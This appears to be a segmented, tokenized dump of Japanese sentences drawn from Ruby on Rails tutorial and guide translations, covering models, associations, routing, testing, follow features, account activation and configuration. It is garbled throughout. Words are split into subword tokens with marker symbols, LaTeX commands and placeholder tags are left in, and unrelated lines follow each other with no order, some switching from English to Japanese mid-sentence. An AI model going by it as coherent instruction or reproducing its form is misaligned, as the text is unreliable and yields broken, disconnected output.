▁ユーザーの プロフィール画面 に ▁[ Follow ] ▁ボタンが表示されている
▁### ▁` find _ or _ create _ by !
▁ 配列 でも 、 文字列 と同様に インスタンス を 生成 できます 。
▁ ついに 、 ユーザー登録 が完成しました ▟ 名前 : ▁“ Rails ▁Tutorial ” 、 メールアドレス : ▁“ \ text tt { example @ railstutorial ▖ org } ” と でも 登録 してみましょう 。
▁### ▁ 機能 テスト
▁# ▁( SQLite 、 MySQL 、 PostgreSQL で 動作 )
▁╼╼ ▁% ▁subsection ▁back _ to _ the _ title _ helper ▁( end )╼╼ ▁\ section { 他の データ構造 } ▁% ▁( fold )╼ ▁\ label { sec : other _ data _ structure s }╼╼
▁ いよいよ Relationship 関連付けの 核 心 、\ k ode { followed _ users } と \ k ode { followers } に取りかかりま す 。
▁has _ many ▁: part s , ▁through : ▁: manifest s
▁しかし 実際には 、 マイクロポストを ユーザー と \ emph { 関連付け る ▁( associate )} ▁ 必要があります ▟ そのため 、 マイクロポストの 投 稿 者 を 記 録 するための \ k ode { user \_ id } も 追加します 。
▁ より 高度な 制限 を使用したい場合 、 Rails で 必要な ` match es ?` に 応答 できる オブジェクトを 渡す 方法があります 。
▁To y アプリケーションの User モデル
▁#### # ▁CDN ヘッダ を デバッグ する
▁もちろん 、 お 望 み であれば 、 この時点で Heroku にデプロイする こともできます 。
▁\ label { fig : home _ page _ feed _ mockup } }╼\ end { figure }╼╼ ▁% ▁section ▁the _ status _ feed ▁( end )╼╼ ▁\ subsection { 動 機 と 計 画 } ▁% ▁( fold )╼ ▁\ label { sec : motivation _ and _ s trategy }╼╼
▁Active ▁Record
▁ まとめると 、 第 \ ref { cha : modeling _ users } 章 から 第 \ ref { cha : account _ activation _ and _ password _ reset } 章 を通して 、 Rails の ログイン と 認証システムを ひ と とおり 開発 します 。
▁identical ▁app / assets / stylesheets / scaffold s ▖ css ▖ scss
▁### ▁ ジョブ を キュー に 登録 する
▁**` ActiveRecord :: Query Cache ` **
▁次に 、 Bundler で使用する \ k ode { Gemfile } ▁ を テキストエディタ で 編集 します ▟ {1} {2} リスト 2▖1 {/2}{/1} の内容 に 書き換えて ください 。
▁ ActiveSupport :: Concern は 、 相 互 に リンク している 依 存 モジュール および 依 存 クラスの 実行 時 読み込み 順序 を 管理 し 、 コードの モジュール 化 を 高 め ます 。
▁たとえば 、\ k ode {" FooBar "▖ underscore } を実行すると \ k ode {" foo \_ bar "} に変換 されます ▟ 従って 、 ▁\ k ode { FooBar } オブジェクトの 外部キー は \ k ode { foo \_ bar \_ id } になる でしょう
▁` has _ many ` 関連付け は 、 他の モデルと の 間 に 「 1 対 多 」 の つながり がある こと を示します 。
▁match ▁' photos ', ▁to : ▁' photos # show ', ▁via : ▁: all
▁ バ イ ト 数を 読みやすい 形式 に フォーマット します ▟ ファイル サイズ を ユーザーに 表示する 場合に 便利です 。
▁この 変更 は 、 Rails ▁4▖1 以降 では シンボル を使用して これらの データ 型 にアクセス でき な くなる という ことを意味します 。
▁ActiveRecord :: Fi x t ure S e t ▖ con text _ class ▖ send ▁: include , ▁Fix t ure File Helpers
▁第 \ ref { cha : updating _ showing _ and _ deleting _ users } 章では 、 基本的な Users リソース ▁( 表 \ ref { table : RESTful _ users } の 標準的な REST アクション をすべて 使用 ) ▁ と 、 自 由 道 の高い 認 証 ▁( authentication ) ▁ および 認可 ▁( authorization ) ▁ システム を作成し ました 。
▁ ユーザーを フォロー した とき や フォロー解除 したときに プロフィール ページ を更新する ために 、 私 た ち が これ から 作成 および 編集 し なければならない のは 、 まさに これらの ファイル です 。
▁ 使用している プラットフォーム や エディタ が 異なる 場合 、 subl を 他の エディタ コマンド に 読み 替 え てください ▁( エディタ の アイコン を ダ ブ ル クリック するか 、\ k ode { m ate }、\ k ode { v im }、\ k ode { gvim }、\ k ode { mv im } などの コマンド に 差し替え ます ) 。
▁{0} 図 2▖1 1 {/0} ▁{1} Rails における MVC {/1}
▁この オプションを使用すると 、 たとえば テスト 実行 順 を 現 行 の 仕 様 のまま に しておきたい 場合は `: s or ted ` を 指定 したり 、 ランダム 実行 を 今のうちに 導 入 したい場合は `: r an dom ` を 指定 したり することができます 。
▁たとえば 、\ k ode { follow \_ form } 要素を 操作 するには 、 以下の 文法 を使用します 。
▁ 具体的には 、 ▁{0} config {/0} 変数 で 「 本番環境で は SSL を強制する 」 という 設定 を する だけです ▁( リスト { p 1 }) 。
▁たとえば 、 データベース の最初の ユーザーの 場合は 、 以下の 配列 になります 。
▁N ▖ name ▁# ▁=> ▁" N "
▁(\ ref { sec : demo _ users _ resource } で 、 この コマンドを 似 た ような 状 況 で 実行 した ことを 思い 出 してみてください ) ▁ 。
▁DELETE
▁これは 、 Rails で アクションを 指定 せずに 生成 した コントローラは 中 身 が 空 のまま になる ためです 。
▁\ k ode { any ?} メソッドは ち ょ う ど \ k ode { empty ?} と 逆 の動作 で 、 要素 が 1 つ でも ある 場合は \ k ode { true } 、 ない場合は \ k ode { false } を返します 。
▁たとえば 、 リスト \ ref { code : users _ migration } の マイグレーション によって 作成された ▁\ text tt { email } 属性 について 考えてみましょう 。
▁SQL ▁( 0 ▖ 8 m s ) ▁COM MIT
▁# ▁< branch > origin / master </ branch >
▁$ ▁bundle ▁exec ▁rake ▁TEST = test / case s / associations / has _ many _ associations _ test ▖ rb
▁# ▁ 開発環境 では アセットを 圧縮 しない
▁もし 多数の 静的なページ が必要になる 場合は 、\ href { https :// github ▖ com / thoughtbot / high _ v ol tag e }{\ text tt { high \_ v ol tag e } } ▁gem ▁ を調べ てみてください 。
▁### ▁ アセット タグ ヘルパー
▁* ▁` edit _ photo _ path (: id ) ` は ` / photos / : id / edit ` を返します ▁( ` edit _ photo _ path (10) ` であれば ` / photos / 10 / edit ` が返されます )
▁- e ▁" signup ▁with ▁invalid ▁information "
▁### ▁` render ` を使用する
▁from : ▁' notification @ example ▖ com '
▁ コア 拡張機能 を 読み込む 方法
▁ ╼ ▁create ▁app / helpers / microposts _ helper ▖ rb
▁(\ k ode { : users } という 一見 奇 妙 な 記 法 は 、 Ruby 言語 特有の 「\ emph { シンボル }」 と呼ばれる ものです ▟ 詳細については \ ref { sec : hashes _ and _ symbols } で説明します ) 。
▁{0}{1} 第 7 章 {/1}{/0} で サイトに ユーザー を追加する ときに 備えて 、 最初の \ k ode { link _ to } に 仮 のリンク を作成します 。
▁### ▁Active ▁Resource
▁# ▁=> ▁[#< Client ▁id : ▁1, ▁first _ name : ▁" Lifo "> , ▁#< Client ▁id : ▁10 , ▁first _ name : ▁" Ryan "> ]
▁ デ バ ッ ガ ー を Users コントローラ ー から 取り 外 す
▁ ある モデルと 異なる 名前空間 にある モデルを 関連付け る には 、 関連付けの 宣言 で 完全な クラス名 を指定する 必要があります
▁このオプション は 、`: log ` または `: raise ` を指定すると 有効 になります 。
▁ ルーティング では 正規表現 で 複 数 行 を扱う ことを 許 していない ので 、 この フラグ を使用して 制限 を加え ています 。
▁* ▁ キャッシュ 制御
▁この 作業 によって 、 これまで の 節 で 行 な っ てきた 実装 が動作する ことも 実 感 できる ことでしょう ▟ テストスイート が パス するだけで は 味 気 ないので 、 実際に 開発 データベースに ユーザーを 登録 することで 喜 び を 感じ ていた だけ れば と思います 。
▁method ▁= ▁instance _ method ( method _ name )
▁ 具体的には 、\ href { http :// localhost :3000/ users }{/ users } の index ページを ブラウザで 開 く という 典型的な 操作 を行う ときに 何 が 起こ っている か を MVC ▁({1}{2} 図 2▖1 1 {/2}{/1} ) ▁ で説明します 。
▁もし うまく い か なくても 、 い つ でも データベースの 中 身 を リ セット できる ので 安 心 してください ▟ リ セット したい場合は 、 以下の 手順を 踏 んで ください 。
▁# ▁=> ▁#< ActiveSupport :: Time Z one : 0 x 7 f 7 36 5 4 d 4 f 38 ▁@ utc _ offset = nil , ▁@ name =" M ad r id ", ▁▖▖▖
▁今度は 自分で 空の フィクスチャ ファイル を作成して データ を追加しましょう 。
▁Oh ▁ dear !
▁| ▁| ▁20 4 ▁| ▁: no _ content ▁|
▁ とは い え 、 User モデルに はまだ バリデーション が ないので 、 このテストは 成功 するはずです 。
▁ 特定の データベース テスト に ター ゲ ッ ト を 絞 って 実行 する方法 の詳細については ` active record / R U N N IN G _ U N IT _ TE ST S ▖ rdoc ` を参照してください ▟ C I ▁( Co nt in u ous ▁ Integration : ▁ 継 続 的 イン テ グ レ ー ション ) サーバー で テストスイート を実行する 方法 の詳細については ` ci / t ra v is ▖ rb ` を参照してください 。
▁Use ▁` bundle ▁show ▁[ gem name ]` ▁to ▁see ▁where ▁a ▁bundle d ▁gem ▁is ▁installed ▖
▁{0}{1} 第 9 章 {/1}{/0} では 、 どの ユーザー も 自分の アカウント 情報を 更新 できるように し 、 Web サイトの 管理者 が ユーザーを削除 できるようにします ▟ それ により 、 Users リソース に 表 \ ref { table : RESTful _ users } の REST アクション がすべて 実装 される ようにします 。
▁resources ▁: messages ▁do
▁上の例では 、1 日 あたり 1 つの 注文 ▁( order ) ▁ オブジェクトを返します が 、1 日 あたり の 注文 合 計 が $ 1 00 を 超 え る 場合にのみ これ を行います 。
▁ 設定 が完了し たら 、 以下の \ k ode { guard } コマンドで Guard と Spork を 同時に 起動 します 。
▁ ステータスフィード 付き の Home ページのモックアップ
▁この アクション を作成する必要があります ▟ ` app / controllers / blorgh / comments _ controller ▖ rb ` の クラス 定義 の中に 以下の行 を追加します 。
▁# ▁< bar ▁type =" integer "> 2 </ bar >
▁最後に Heroku へ 展開 することもできます 。
▁" invoices "▖ classify ▁# ▁=> ▁" Invoice "
▁` member ` ルーティング が 1 つだけ しか ない のであれば 、 以下のように ルーティング で `: on ` オプション を指定する ことで ブロック を省略 できます 。
▁上 は アプリケーションの ▁ _ ルーティング ファイル _ ▁ の内容 です ▟ 外部 からの リクエストを どのように コントローラと アクションに 振 り 分ける か を 、 DSL ▁( ドメイン 特 化 言語 : ▁domain - specific ▁language ) ▁という 特殊な 言語 を使用して この ファイル 内 に記述 します 。
▁#### ▁` pluralize `
▁* ▁FROM ▁" articles " ▁WHERE ▁( id ▁> ▁10 ) ▁OR DER ▁BY ▁id ▁ desc ▁LIMIT ▁20
▁Ruby では 暗 黙 的に 関数 の 最後の 式 の値 を返す ので 、 上の \ text tt { foo } メソッドは 、\ text tt { boolean ?} が \ text tt { true } である か \ text tt { false } である か に応じて 、\ text tt {" bar "} または \ text tt {" baz "} をそれぞれ 返します 。
▁To y アプリケーションは 、 後に 作成する サンプルアプリケーション と同様 、\ emph { ユーザー } と 、 それ に 関連 している \ emph { マイクロポスト } から 成り立 っています 。
▁def ▁set _ cookie
▁この リレーションシップ は 今後 \ k ode { follower _ id } と \ k ode { followed _ id } で 頻繁に 検索 すること になるので 、 リスト \ ref { code : relationships _ migration } に示したように 、 それぞれの カラム に インデックス を追加します 。
▁ アセット タグ ヘルパー が提供する メソッドは 、 フィード 、 JavaScript 、 スタイルシート 、 画像 、 動 画 および 音 声 の ビュー にリンクする HTML を生成する ためのものです 。
▁ 管理者 権限 の 制御 を アクション レベルで テスト する
▁ 例えば
▁ 当 初 、 本チュートリアル は ある程度 の プログラミング 経験 と Web 開発 経験 がある 読者 を 対象 に していました が 、 現在 は 開発 初心者 を含め た より 多くの 読者 を 対象 と する ように 書き 直 しました 。
▁{0} 図 12 ▖ 11 {/0} ▁{1} Home ページに フォロー 関連の 統 計 情報 を表示する {/1}
▁次に 重要な 要素 は 、\ k ode { form } タグ 自身 です 。
▁NOTE : ▁Action ▁View の一部 の 機能 は Active ▁Record と 結 び つ い ています が 、 Action ▁View が Active ▁Record に依存し ている わけではありません 。
▁上の URL の 「\ k ode { q 5 lt 38 h Q D c \_ 9 59 P V oo 6 b 7 A }」 という 部分 は \ k ode { new \_ token } メソッド で生成された ものです ▁( リスト \ ref { code : token _ method })▟ URL で 使用 できるように Base 64 で エンコード されています ▟ これは ち ょ う ど / users /1/ edit の 「 1 」 のような ユーザー ID と同じ 役 割 を 果 た します 。
▁| ▁GET ▁| ▁ / photos ▁| ▁images # index ▁| ▁photos _ path ▁|
▁options _ from _ collection _ for _ select (@ project ▖ people , ▁" id ", ▁" name ")
▁第 \ ref { cha : user _ microposts } ▁ 章 と 第 \ ref { cha : following _ users } 章では 、 関連付けられた ユーザー と マイクロポストを 同時に 表示 し 、 Twitter のような マイクロポストの フィード を作成する 予定です 。
▁上 は 以下 に置き換えられます 。
▁リスト \ ref { code : user _ model _ password _ reset _ expired } のコード を使用すると 、 リスト { p 2 } の {3} update {/3} アクション が動作する ようになります 。
▁\ k ode { create } アクション 内の インスタンス変数 を使用する ための テンプレート
▁ 繰り返し ますが 、 ブラックリスト による フィルタ は 永 遠 に 不 完全な まま に し かなり ません 。
▁Action ▁Controller は 、 データベース と の やりとり や 、 必要 に応じた CRUD ▁( Create / Re ad / Update / Delete ) ▁ アクション の実行 に か か わ ります 。
▁Active ▁Support には 「 ( html 的に ) ▁ 安全 な 文字列 」 という 概念 があります 。
▁`-- mountable ` オプションを使用すると 、` - - full ` オプション に 以下 が追加され ます 。
▁この章では 、 ゼロ から User モデル を作成し 、 そこに name 属性 や email 属性 、 パスワード 属性 を加え ました ▟ また 、 それぞれの 値を 制限 する 多くの 重要な バリデーション も 追加 しました 。
▁ ============== ================
▁ システム 上で 動いている すべての プロセス は 、\ text tt { p s } コマンド に \ text tt { a u x } オプション を付け て 実行 することで 確 認 できます 。
▁この 魔 術 的な \ k ode { has \_ secure \_ password } 機能を 使えるように するには 、1 つだけ 条件 があります ▟ それ は 、 モデル 内に \ k ode { password \_ digest } という 属性 が含まれている ことです 。
▁( このような エラーを 捉 え る ことができる のが 、 ビューで S p ec s を使用する 大きな メ リ ッ ト です 。
▁ 既に お 気 付き の方 も い る と思います が 、 マイグレーション は 逐 次 的に 実行 され 、 それぞれの マイグレーション に対して バージョン番号 が 付 与 されます ▟ したがって 、 上 記 の \ text tt {0} を 別の 数字 に置き換える ことによって 、 指定した バージョンの 状態 に 戻 す ことができます 。
▁なお 、 リスト { p 0} では 、 {2} count : ▁2 {/2} を使用して リンク が 2 つ ある かどうかを確認 している ので 、 比較してみると よいでしょう 。
▁Ruby ▁on ▁Rails ▁( 単 に 「 Rails 」 と呼ぶ こともあります ) ▁ は 、 Ruby プログラミング言語 で 記 述 された 、 Web 開発 フレームワーク です 。
▁ ハッシュの 1 要素を 角 かっこ を使って 定義 する 代わりに 、 以下のように キー と 値を ハッシュ ロ ケ ッ ト と呼ばれる \ k ode { => } ▁ によって リテラル 表現 する ほ う が 簡単です 。
▁ Sign ▁up
▁ メイラー の ビュー は ` app / views / name _ of _ mailer _ class ` ディレクトリ に置かれ ます 。
▁第 \ ref { cha : user _ microposts } 章では ただ の プロ ト タイプ でした が ▁( 図 \ ref { fig : home _ with _ proto _ feed }) 、 リスト \ ref { code : feed _ final } の実装 によって 、 Home ページ で 完全な フィード が 表示 でき ている ことがわかります ▁( 図 \ ref { fig : home _ page _ with _ feed }) 。
▁この ルーティング ファイルは Rails の \ k ode { config } ディレクトリ の下に 置かれ ます ▟ この ディレクトリ には 、 Rails の設定 ファイルが まとめて 置かれ ます ▁( 図 \ ref { fig : config _ directory _ rails }) 。
▁ 挿 入 時に も同様に 、 現在 残 っている すべての レコードが 一意 である ように する ( 関連付けを 検 査 したときに 重複 レコードが 決 して 発生 し ないようにする ) には 、 テーブル 自体 に 一意 の インデックス を追加する 必要があります 。
▁上の 行 では 、` Blorgh :: Article ` モデルと コメント が ` has _ many ` 関連付け として 定義されている 必要があります が 、 現時点では まだ ありません 。
▁ これら を使用する場合 は ` Blorgh ▖ author _ class ` という 名前 で 参 照 する必要があります 。
▁invoke ▁scaffold _ controller
▁ 世界 の ほぼ すべての タイムゾーン を含む オプション タグ の 文字列 を返します 。
▁ テスト ヘルパーメソッド 名を 、 Session ヘルパーメソッド 名 \ k ode { log \_ in \_ as } ▁( リスト \ ref { code : test _ helper _ log _ in }) ▁ とは 異なる \ k ode { is \_ logged \_ in ?} で 定義 することで 、 この問題 を 回 避 できます 。
▁ これが 、 その 正規表現 です 。
▁ 今後 の 学習 の 手 始 め と するために 、 この節 では サンプルアプリケーションの コア 部分 の さまざまな 拡張 方法を 提 案 し 、 それぞれ に必要な 学習 内容 についても 示 します 。
▁* ▁` add _ routing _ paths `: ▁ デフォルトで すべての ` config / routes ▖ rb ` ファイルを 読み込み 、 アプリケーションの ルーティング を設定します ▟ この ` config / routes ▖ rb ` ファイルは 、 アプリケーション だけ ではなく 、 エンジン などの railties に もあります 。
▁この 関数 は \ emph { ヘルパー } と呼ばれ ます ▟ カスタム ヘルパー を作成する 方法 を学ぶ ために 、 まず {1} {2} リスト 4 ▖ 1 {/2}{/1} の タイトル 行 の 部分 に注目し ましょう 。
▁` prev _ week ` は ` last _ week ` の別名 です 。
▁@ business ▁= ▁ business
▁` config ` 呼び出し は 、 この イベント より 前に 評価 されます ので 注意してください 。
▁config ▖ middleware ▖ delete ▁" Rack :: Lock "
▁ authenticated ?( : remember , ▁token )
▁d ▖ sunday ▁# ▁=> ▁Sun , ▁ 16 ▁Sep ▁2012
▁( 訳 注 : ▁ heroku コマンド のバージョン が 古 い と ここで 失敗する かもしれません ▟ その 場合は 、 Heroku ▁T oolbelt ▁( ▁ https :// t oolbelt ▖ heroku ▖ com / ▁ ) ▁ を使って 最新 版 に 更新 するか 、 次の 古 い 文法 の コマンドを 試 してみてください : ▁$ ▁ heroku ▁add on s : add ▁ sendgrid : start er ▁ ) ▁[ B R ] ╼[ B R ] ╼ アプリケーションで SendGrid ア ド オン を使用する には 、 production 環境 の \ href { https :// en ▖ w ikipedia ▖ org / wiki / Simple _ Mail _ Transfer _ Protocol } { SMTP } に 情報を 記 入 する必要があります 。
▁ そして 、 認 証 に必要な すべての メソッド も ここ まで に 学 んで あります ▁( そう な るように 本書 を 書いた のです )▟ ここでは 、 Active ▁Record が提供する \ k ode { User ▖ find _ by } メソッド ▁(\ ref { sec : find ing _ user _ objects }) ▁ と 、\ k ode { has _ secure _ password } が提供する \ k ode { authenticate } メソッド ▁(\ ref { sec : user _ authentication }) ▁ を使用します 。
▁{0} 図 2▖ 5 ▁{/0}{1} 新規ユーザー 作成 ページ ▁(\ href { http :// localhost :3000/ users / new }{/ users / new }) {/1}
▁たとえば 、` nil `、` true `、` false ` の場合は 自分自身 を返します 。
▁* ▁[ R ailscasts : ▁ 控 え め な JavaScript ]( http :// r ailscasts ▖ com / episodes / 20 5 - u nobtrusive - javascript )
▁< input ▁id =" person _ last _ name " ▁name =" person [ last _ name ] " ▁type =" text " ▁/>
▁ nick ▁= ▁Client ▖ find _ or _ initialize _ by ( first _ name : ▁' N ic k ')
▁リスト \ ref { code : add _ remember _ digest _ to _ users _ generated } の マイグレーション を行って あるので 、 User モデルに は既に \ k ode { remember \_ digest } 属性 が追加され ています が 、\ k ode { remember \_ token } 属性 はまだ 追加 されていません 。
▁Because ▁Rails ▁creates ▁a ▁substan tial ▁number ▁of ▁aux i li ary ▁files ▁along ▁with ▁the ▁controller ▁( as ▁seen ▁in ▁Listing ▁\ ref { code : generating _ pages }), ▁this ▁isn ’ t ▁as ▁easy ▁as ▁remov ing ▁the ▁controller ▁file ▁itself ; ▁ 自動生成 された コードを 元に戻す ためには 、 新規 作成された ファイル を削除する だけ ではなく 、 既存の ファイルに 挿入され た コード も 削除 する必要があります
▁boolean 型の \ k ode { admin } 属性を User に追加する マイグレーション
▁\ k ode { cookies ▖ signed [: user _ id ]} では 自動的に ユーザー ID の cookies の 暗 号 が 解除 され 、 元に戻 ります 。
▁ 以上 をすべて ヘッダー の パーシャル 部分 に 適用 して 更新 したものを リスト \ ref { code : layout _ login _ logout _ links } に示します 。
▁[ remember ▁me ] ▁ チェックボックス の 送信 結果を 処理 する
▁ 後 は Rails を 実際に 勉 強 する だけです 。
▁ 見え やすくするため 、 図 \ ref { fig : na ive _ user _ has _ many _ following } から \ k ode { following } テーブルの \ k ode { id } カラム を省略 しました 。
▁` Rails :: Engine ` クラスを 継 承 する ことによって 、 指定された パス に エンジン がある ことが gem から Rails に 通知 され 、 アプリケーションの 内部 に エンジン が正しく マウント されます ▟ そして 、 エンジンの ` app ` ディレクトリ を モデル / メイラー / コントローラ / ビューの 読み込み パス に追加します 。
▁ strip _ tags (" S tr ip ▁< i > the se </ i > ▁tags !" )
▁< div ▁id =" to p _ menu "> To p ▁ menu ▁ items ▁here </ div >
▁Microposts コントローラの 認可 テスト
▁< td > <%= ▁link _ to ▁' Destroy ', ▁article _ path ( article ),
▁def ▁default _ helper _ module !
▁上の例では 、 属性の値 を インクルード する方法 を 示す ために `: message ` オプション も 使用 しています 。
▁config ▖ assets ▖ prefix ▁= ▁"/ 他の パス "
▁ 関連付けられたオブジェクト が データベースから 検索 された こと がある場合 は 、 キャッシュ された もの を返します 。
▁M ▖ name ▁# ▁=> ▁" M "
▁# ▁Rails ▁> = ▁4▖1
▁ 引数 が nil で あった ら どう なる か 。
▁ これはリスト \ ref { code : user _ model _ remember } で使用されていました 。
▁ これはリスト \ ref { code : following _ followers _ tests } で使用されていました 。
▁ 受け取った パスワードが ユーザーの パスワード と 一致する と ユーザー が返され 、 一致し ない場合は \ k ode { false } が返されます 。
▁ テキストエディタ と コマンドライン
▁ アカウント有効化 ▁( リスト \ ref { code : account _ activation _ edit _ action }) ▁ の場合と同様 、\ k ode { params [: email ]} にある メールアドレス に対応する ユーザーを この 変数 に保存 します 。
▁My app :: Application ▖ config ▖ secret _ token ▁= ▁' ex ist ing ▁secret ▁token '
▁### ▁ 安全 な 出力
▁$ ▁rake ▁db : migrate
▁このとき 、 ローカル 環境 ▁( 開発 用の 環境 ) ▁ で Puma を使う 必要はない ので 、 リスト \ ref { code : puma _ gemfile } のように \ k ode { : production } グループ の中に 追加 しておきます 。
▁Rails には コマンドライン から 実行する コマンド が 多数 あるので 、 最初から コマンドライン が 利用できる クラウド は非常に 便利です 。
▁m attr _ accessor ▁: mechanism
▁ここでは 、 記憶ダイジェスト が \ k ode { nil } の 場合には \ k ode { return } キーワード で 即座に メソッドを 終 了 しています ▟ 処理を 中 途 で 終 了 する 場合に よく 使われ る テクニック です 。
▁ u ▖ name ▁= ▁" David "
▁ 変更 前 は 、 ユーザーの プロファイル ページ ▁(\ ref { sec : successful _ signup s }) ▁ にリダイレクトし ていました が 、 アカウント有効化 を実装する うえで は 無 意味 な 動作 なので 、
▁ 今回の テストでは 、 ログイン 、 index ページ にアクセス 、 最初の ページに ユーザーが い る ことを確認 、 ページネーション のリンク がある ことを確認 、 といった 順 で テスト していきます 。
▁ 有効 になっ ていない ユーザー に表示される 警 告 メッセージ
▁これ を作成する には 、 アプリケーションのルート ・ ディレクトリ で 以下のコマンドを実行し ます 。
▁ assert _ routing ( { ▁path : ▁' photos ', ▁method : ▁: post ▁ }, ▁ { ▁controller : ▁' photos ', ▁action : ▁' create ' ▁ })
▁ ╼\ end { code }╼╼ ▁\ subsection { データモデル の 問題 ▁( および 解決策 )} ▁% ▁( fold )╼ ▁\ label { sec : a _ problem _ with _ the _ data _ model }╼╼
▁これで 、 admin テストはパスするはずです 。
▁ クラス について の 理解 を 深 め る には 、 自分で クラス を作成 してみる のが 一番 です 。
▁今度は テストスイート が パスするはずです 。
▁もちろん 、 新しい サンプルデータを 生成 するためには Rake タスク の \ k ode { db : populate } を実行する 必要があります 。
▁<%= ▁comment ▖ body ▁%>
▁| ▁DELETE ▁| ▁ / kategorien / : id ▁| ▁categories # destroy ▁| ▁ category _ path (: id ) ▁|
▁そこで 、 読者 の 経験 や 知識 に応じた 、\ emph { Rails チュートリアル } を 読 破 するための ア ド バ イ ス を用意し ました ▟ ぜ ひ 参考にしてください 。
▁ ビュー に レイアウト がある の と同様 、 パーシャル でも 独自の レイアウトファイル を使用する ことができます 。
▁* ▁` scope d _ by _▖▖▖` ▁ に代えて ▁` where (▖▖▖) ` ▁ を使用
▁この バリデータ は 、 アプリケーション のライフサイクル 内で ▁* 一度 しか 初期化 されない * ▁ 点にご注意ください ▟ バリデーション が 実行される たびに 初期化 される ような ことはありません ▟ インスタンス変数 の 扱 い には 十分 ご注意ください 。
▁create _ account
▁上のコードでは 、 単 に \ k ode { true } を \ k ode { case _ sensitive : ▁false } で 置き換え た だけ である ことに注目してください ▟ Rails は この場合 、\ k ode { : uniqueness } を \ k ode { true } と 判 断 します 。
▁1 つ 前の 章 のとき と同じように 、 サンプルデータを 自動 作成する Rake タスク を使用して データベースに サンプル リレーションシップ を 登録 する のが や は り 便利です 。
▁` test ` ディレクトリに 他の ディレクトリ を作成する こともできます 。
▁* ▁` ActiveRecord :: Fi x t ure S e t ` の導入に伴い 、 Rails ▁4▖0 では ` ActiveRecord :: Fi x t ure s ` が 非推奨 となり ました 。
▁<%= ▁@ article ▖ title ▁%>
▁以下の例 では 、 苗 字 と 名前 が 小文字 で 始 ま らない ように したい と 考え ています 。
▁Rails における 「 レイアウト 」 は 、 多くの コントローラのアクション に わ た って 共通 して 使用できる テンプレート の ことです 。
▁class ▁Article ▁< ▁ActiveRecord :: Base
▁ 「 / users 」 リクエスト は 、 Rails のルーティング 機 構 ▁( ルーター ) ▁ によって Users コントローラ内の \ k ode { index } アクション に割り当てられ る 。
▁最後に 、 データベース を マ イ グ レ ート します 。
▁* ▁` config ▖ action _ dispatch ▖ default _ headers ` は 、 HTTP ヘッダー で使用される ハッシュ です ▟ この ヘッダー はデフォルトで すべての レスポンス に設定されます 。
▁### ▁` validates _ associated `
▁Rails で 新規 プロジェクト を作成する と デフォルトで SQLite が 指定 されます が 、 これは い つ でも 後 から 変更 できます 。
▁{0} 図 7 ▖ 10 {/0} {1} 現状の ユーザー登録ページ ▁\ href { http :// localhost :3000/ signup }{/ signup } ▟\ href { http :// railstutorial ▖ org / images / figures / new _ signup _ page _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ ミドルウェアスタック を調べる と 、` Rack :: Lock ` が 消え ていること が 分 か ります 。
▁ 配列 や 範囲 オブジェクト と同様 、 ハッシュ も \ k ode { each } メソッドに 応答 します 。
▁この節では 、 フォローしているユーザー 数 に応じて ス ケ ー リ ング できるように 、 ステータスフィード を再度 実装します 。
▁ 関連付け の詳細 情報
▁create ▁mode ▁100 64 4 ▁README ▖ rdoc
▁この節では 、 Asset ▁Pipeline の概要 と 、 素晴らしい CSS 生成 ツール である 「\ emph { Sass }」 の使い方 について説明します 。
▁もちろん 、 この \ k ode { cookies } は \ emph { 本 物 の } ハッシュ ではなく 、 実際には \ k ode { cookies } に 割り当て を 行った ときに ブラウザ 上の テキスト の 断 片 を \ emph { 保存 } している だけです ▟ そう した アプリケーションの 実装 の詳細 を 気 に し なく て よい 点 に 、 Rails の 美 し さ の 一 端 が 垣 間 見え ます 。
▁ これはリスト \ ref { code : following _ followers _ authorization _ test } で使用されていました 。
▁ ブラックリスト を元に している 限り 、 必ず 将来 漏 れ が生じ ます 。
▁たとえば Proc オブジェクト を渡すと 、 Proc を 渡された ブロック には ` controller ` インスタンス が渡され ます ▟ これにより 、 現在の リクエスト を元に して レイアウト を 決定 することができます 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁* ▁` config ▖ action _ controller ▖ request _ forgery _ protection _ token ` は 、 Request For ge ry 対策 用の トークン パラメータ 名 を設定します 。
▁つまり 、 デ コ レ ー タ は 手動で require する 必要がある ということです 。
▁第 一 に 、 丸 かっこ が ありません 。
▁run ▁Rails ▖ application ▖ routes
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / deep _ dup ▖ rb ` です 。
▁`: except ` オプションは 逆に 、 指定した ルーティング のみ を 生成 ▁ _ しない _ ▁ よう 指示 します 。
▁{0} 図 12 ▖ 18 {/0} ▁{1} 別の ユーザーの フォロワー を表示する {/1}
▁リスト \ ref { code : user _ edit _ view } で 定義された edit フォーム ▁( 図 \ ref { fig : edit _ page }) ▁ の HTML
▁`: if ` オプションは 、 特定の 条件 で バリデーション を行なう ▁** べ き である ** ▁ 場合に 使用します 。
▁図 \ ref { fig : micropost _ length _ error } に示した とおり 、 マイクロポスト の内容 が 長 すぎる という \ emph { エラーメッセージ } が Rails によって 表示されます
▁# ▁ すぐに メール送信 したい場合は # deliver _ now を使用
▁ コントローラ 内に アクションを 手 作り するには 、 単 に コントローラ 内で メソッドを 定義 すればよいのです 。
▁ 激 しく 移 り 変わる セキュリティ の 動 向 に 常に 目 を 配 り 、 最新の 情報を 入 手 するようにしてください ▟ 新しく 登 場 した 脆弱性 を見 逃 す と 、 壊 滅 的な 損 害 を こう む る可能性があります 。
▁\ k ode { name } 属性 に 長さ の検証 を追加する ▁GR EEN {3} { 4 } {/4} { 4 } { 5 } { /5}{/ 4 } { 4 } {/4} {/3}
▁Date : ▁Tue , ▁ 12 ▁Apr ▁200 5 ▁ 22 : 0 9 : 07 ▁GMT
▁Ruby ▁on ▁Rails を 学習 中 !
▁この節では 、 ユーザーに 最後の 属性 を追加します ▟ セキュア パスワード は 、 サンプルアプリケーション で ユーザーを 認 証 するために 使用します 。
▁最後に 、 この リファクタリング が 正常に 行われた ことを確認する ために 、 リファクタリング 前 と同様に テストにパス する ことを確認します 。
▁ 間違った ユーザーが 編集 し ようとした ときの テスト
▁` pluralize ` と 逆 の動作 です 。
▁{0} 図 7 ▖ 14 {/0} {1} ユーザー登録 が 失敗した とき のモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / signup _ failure _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ 作成し た時点で のユーザー オブジェクトは 、\ k ode { id } 属性 、 マジックカラム である \ k ode { created _ at } 属性 と \ k ode { updated _ at } 属性の値 が いずれも \ k ode { nil } で あった ことを思い出してください 。
